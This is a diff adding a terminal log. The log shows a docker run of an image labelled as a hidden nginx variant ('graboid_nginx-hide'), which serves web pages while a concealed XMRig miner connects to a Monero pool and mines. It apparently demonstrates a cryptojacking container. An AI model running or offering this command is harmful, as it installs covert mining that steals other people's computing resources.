@@ -1,0 +1,39 @@
+$ docker run --rm --name nginx --network bridge -p 80:80 -it danielma911/graboid_nginx-hide:v8.9
+ * ABOUT        XMRig/5.5.0 gcc/7.4.0
+ * LIBS         libuv/1.18.0 OpenSSL/1.1.1 hwloc/1.11.9
+ * HUGE PAGES   supported
+ * 1GB PAGES    unavailable
+ * CPU          Intel(R) Core(TM) i7-3770 CPU @ 3.40GHz (1) x64 AES
+                L2:0.5 MB L3:16.0 MB 2C/2T NUMA:1
+ * MEMORY       1.2/1.9 GB (61%)
+ * DONATE       5%
+ * ASSEMBLY     auto:intel
+ * POOL #1      pool.supportxmr.com:5555 coin monero
+ * COMMANDS     hashrate, pause, resume
+ * OPENCL       disabled
+ * CUDA         disabled
+192.168.2.142 - - [13/Jan/2020:21:57:40 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" "-"
+192.168.2.142 - - [13/Jan/2020:21:57:40 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" "-"
+[2020-01-13 21:57:40.987]  net  use pool pool.supportxmr.com:5555  104.140.201.42
+[2020-01-13 21:57:40.987]  net  new job from pool.supportxmr.com:5555 diff 100001 algo rx/0 height 2010612
+[2020-01-13 21:57:40.989]  msr  msr kernel module is not available
+[2020-01-13 21:57:40.989]  rx   init dataset algo rx/0 (2 threads) seed 8d3b98130fa15d16...
+[2020-01-13 21:57:40.989]  rx   not enough memory for RandomX dataset
+[2020-01-13 21:57:40.989]  rx   failed to allocate RandomX dataset, switching to slow mode (1 ms)
+[2020-01-13 21:57:43.377]  rx   dataset ready (2387 ms)
+[2020-01-13 21:57:43.378]  cpu  use profile  rx  (2 threads) scratchpad 2048 KB
+[2020-01-13 21:57:43.401]  cpu  READY threads 2/2 (2) huge pages 0% 0/2 memory 4096 KB (23 ms)
+[2020-01-13 21:58:25.765]  net  new job from pool.supportxmr.com:5555 diff 100001 algo rx/0 height 2010613
+[2020-01-13 21:58:41.324]  net  new job from pool.supportxmr.com:5555 diff 100001 algo rx/0 height 2010614
+[2020-01-13 21:58:44.382] speed 10s/60s/15m 40.1 50.3 n/a H/s max 60.5 H/s
+[2020-01-13 21:59:06.558]  net  new job from pool.supportxmr.com:5555 diff 51724 algo rx/0 height 2010614
+[2020-01-13 21:59:45.158] speed 10s/60s/15m 49.4 42.5 n/a H/s max 60.5 H/s
+[2020-01-13 22:00:06.580]  net  new job from pool.supportxmr.com:5555 diff 50000 algo rx/0 height 2010614
+[2020-01-13 22:00:17.007]  net  new job from pool.supportxmr.com:5555 diff 50000 algo rx/0 height 2010615
+[2020-01-13 22:00:45.875] speed 10s/60s/15m 45.8 47.9 n/a H/s max 60.5 H/s
+[2020-01-13 22:01:25.865]  net  new job from pool.supportxmr.com:5555 diff 50000 algo rx/0 height 2010616
+[2020-01-13 22:01:46.774] speed 10s/60s/15m 45.5 47.1 n/a H/s max 60.5 H/s
+[2020-01-13 22:02:12.087]  net  new job from pool.supportxmr.com:5555 diff 50000 algo rx/0 height 2010617
+[2020-01-13 22:02:25.971]  net  new job from pool.supportxmr.com:5555 diff 50000 algo rx/0 height 2010618
+[2020-01-13 22:02:47.718] speed 10s/60s/15m 49.7 44.9 n/a H/s max 60.5 H/s
+[2020-01-13 22:03:48.678] speed 10s/60s/15m 39.2 44.7 n/a H/s max 60.5 H/s
